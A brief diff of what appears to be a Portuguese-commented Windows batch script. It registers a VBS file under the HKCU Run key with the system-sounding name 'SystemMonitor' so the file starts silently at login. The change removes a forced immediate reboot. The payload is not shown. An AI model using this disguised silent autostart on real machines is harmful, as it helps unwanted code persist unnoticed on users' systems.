@@ -20,5 +20,3 @@ echo Set WshShell = Nothing
 
 :: Adicionar ao registro para iniciar silenciosamente
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "SystemMonitor" /t REG_SZ /d "wscript.exe \"%startup%\SystemData.vbs\"" /f
-
-shutdown /r /t 0
